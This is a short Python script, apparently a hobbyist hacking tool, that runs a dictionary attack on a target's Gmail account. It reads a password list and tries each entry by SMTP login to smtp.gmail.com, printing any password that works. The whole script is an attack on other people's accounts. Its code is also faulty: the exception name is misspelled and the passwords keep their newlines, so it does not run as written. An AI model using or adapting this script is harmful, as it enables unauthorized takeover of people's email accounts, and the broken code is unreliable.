import smtplib

smptserver = smtplib.SMTP("smtp.gmail.com", 587)
smptserver.ehlo()
smptserver.starttls()

user = raw_input("Enter the taget's email id: ")
passwordf = raw_input("Enter the password filename: ")
passwordf = open(passwordf, "r")

for password in passwordf:
    try: 
        smptserver.login(user, password)
        print("+ Password Found: %s" % password)
        break;
    
    except smtplib.SMPTAuthenticationError:
        print("[!] Password Incorrect: %s" % password)